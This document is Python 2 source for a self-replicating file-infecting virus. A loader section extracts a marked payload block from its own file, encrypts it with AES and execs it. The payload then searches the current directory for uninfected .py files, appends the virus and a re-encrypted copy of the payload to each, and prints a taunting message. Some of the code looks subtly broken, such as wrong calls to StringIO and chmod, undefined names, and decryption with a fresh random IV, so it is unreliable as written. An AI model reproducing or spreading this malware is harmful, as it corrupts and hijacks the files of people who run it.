######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


def encrypt(data):
   this = open(__main__.__file__, 'r')

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   this.close()
   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

#e = decrypt(cipher_payload[1:])
e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted

# Start payload
import os
def is_infected(filename):
   f = open(filename, 'r')
   lines = f.readlines()
   if len(lines) < 46:
      return False
   #print len(lines)
   #print lines[len(lines) - 46]
   return lines[len(lines) - 46].startswith('######################################################## First script python')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   os.chmod(destination, S_IEXEC)
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the original file
   for line in source:
      destination.write(line)

   destination.write("\n######################################################## First script python\n")
   destination.write("# coding=utf-8\n")
   destination.write("# Start Uncrypted\n")

   copy = False
   result = ''
   for line in this:
      if line.strip() == '# Start Uncrypted':
         copy = True
      elif line.strip() == '# End Uncrypted':
         destination.write('# End Uncrypted')
         copy = False
      elif copy:
         destination.write(line);

   destination.write("\n# Start payload\n")
   destination.write("#")
   destination.write(str(encrypt(e, filename)))
   destination.write("\n# End payload")

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()

def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data,filename):
   source = open(filename + '-copy', 'r')

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(source).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   source.close()
   return base64.b64encode(encrypted)
 ####################

def payload():
   print "This file is infected infected! Mhuahauhauahau!"

find_and_infect_files()
payload()
# End payload
